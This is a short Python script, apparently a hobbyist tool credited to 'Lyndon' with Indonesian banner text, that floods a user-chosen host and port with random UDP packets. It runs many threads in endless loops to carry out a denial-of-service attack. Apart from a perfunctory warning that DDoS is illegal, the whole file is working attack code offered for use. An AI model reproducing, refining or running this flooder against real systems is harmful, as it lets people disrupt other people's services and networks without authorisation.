import random
import socket
import os,sys
import threading
import time

print("""\033[91m                      WARNING!!!
DDOS MERUPAKAN HAL YANG ILEGAL KALAU LU ABUSE BAKAL GUA HAPUS TOOLSNYA""")
print("\033[0m")
print("\033[94mCode By Lyndon")
print("\033[0m")
print("Tunggu 5 Detik Brader...")
time.sleep(5)

os.system("clear")
print("""\033[95m
 Tools By : Lyndon
  
████████████████████████████████████████
█▄─▄███▄─█─▄█▄─▀█▄─▄█▄─▄▄▀█─▄▄─█▄─▀█▄─▄█
██─██▀██▄─▄███─█▄▀─███─██─█─██─██─█▄▀─██
▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▀▀▄▄▀
""")
print("\033[0m")
ip = str(input("[•] Host/Ip: "))
port = int(input("[•] Port: "))
choice = str(input("[•] DdosKaga?(y/n): "))
times = int(input("[•] Packets: "))
threads = int(input("[•] Threads: "))
os.system("clear")
def wibu():
	ddos = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(ddos,addr)
			print(i +" \033[95mLyndon Attack %s Port %s" %(ip,port))
		except:
			print("\033[91m[×] Down | Lyndon!!!")

def wibu2():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" Lyndon Attack %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] Down | Lyndon!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = wibu)
		th.start()
		th = threading.Thread(target = wibu2)
		th.start()			
